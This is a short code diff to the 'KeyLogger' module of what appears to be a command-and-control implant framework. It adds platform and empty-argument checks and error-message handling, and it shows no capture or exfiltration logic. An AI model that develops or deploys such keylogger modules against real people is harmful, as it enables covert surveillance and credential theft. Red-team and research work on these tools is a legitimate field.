@@ -186,6 +186,11 @@ void KeyLogger::run(void* keyLoggerPtr)
 
 int KeyLogger::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
+#ifndef _WIN32
+    return c2coreUnsupportedPlatform(c2Message, c2RetMessage);
+#endif
+    if (c2Message.args().empty())
+        return c2coreInvalidRequest(c2Message, c2RetMessage);
     c2RetMessage.set_instruction(c2Message.instruction());
     std::string args = c2Message.args();
 
@@ -228,6 +233,9 @@ int KeyLogger::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 int KeyLogger::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
 {
+    if (c2RetMessage.errorCode() == C2CORE_ERROR_UNSUPPORTED_PLATFORM ||
+        c2RetMessage.errorCode() == C2CORE_ERROR_INVALID_REQUEST)
+        return ModuleCmd::errorCodeToMsg(c2RetMessage, errorMsg);
 #ifdef BUILD_TEAMSERVER
     int errorCode = c2RetMessage.errorCode();
     if(errorCode>0)
